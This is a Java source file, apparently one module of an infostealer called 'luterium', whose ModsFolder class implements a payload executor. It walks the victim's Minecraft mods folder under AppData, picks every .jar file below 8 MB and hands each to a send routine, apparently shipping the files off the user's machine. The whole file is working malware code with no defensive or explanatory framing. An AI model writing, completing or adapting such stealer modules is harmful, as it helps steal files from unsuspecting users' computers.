package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Optional;

/**
 * @author Peter
 * @since 09/01/2022
 */

public class ModsFolder implements PayloadExecutor {
    Main main = new Main();

    @Override
    public void execute() throws Exception {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\mods"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\mods"))
                .filter(path -> path.toFile().getName().endsWith(".jar"))
                .filter(path -> {
                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> main.theThing.send(path.toFile()));
    }
}
